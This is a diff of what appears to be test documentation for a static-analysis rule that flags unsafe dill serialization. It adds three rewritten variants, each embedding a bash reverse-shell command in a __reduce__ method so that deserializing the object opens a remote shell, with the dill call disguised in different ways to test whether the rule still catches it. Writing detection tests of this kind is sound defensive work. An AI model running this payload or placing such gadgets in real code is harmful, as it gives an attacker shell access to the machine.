@@ -36,7 +36,6 @@ rules:
 ````
 ### Code Snippet
 ```python
-
 class Shell_code(object):
     def __reduce__(self):
         return (
@@ -52,16 +51,45 @@ shell = dill.dumps(Shell_code())
 ```
 ### Transformation 1*
 ```python
+class Shell_code(object):
+    def __reduce__(self):
+        return (
+            os.system,
+            ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',),
+        )
 
+
+import dill
+
+# ruleid: avoid-dill
+myfunc = dill.dumps
+shell = myfunc(Shell_code())
 ```
-
-
 ### Transformation 2
 ```python
+import os
+import sys
 
+sys.modules['dill'] = __import__('dill')
+
+class Shell_code(object):
+    def __reduce__(self):
+        return (os.system, ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))
+
+shell = sys.modules['dill'].dumps(Shell_code())
 ```
 ### Transformation 3
 ```python
+import os
+import dill
 
+class Shell_code(object):
+    def __reduce__(self):
+        return (os.system, ('/bin/bash -i >& /dev/tcp/"Client IP"/"Listening PORT" 0>&1',))
+
+def get_dill(d=dill.dumps):
+    return d(Shell_code())
+
+shell = get_dill()
 ```
 
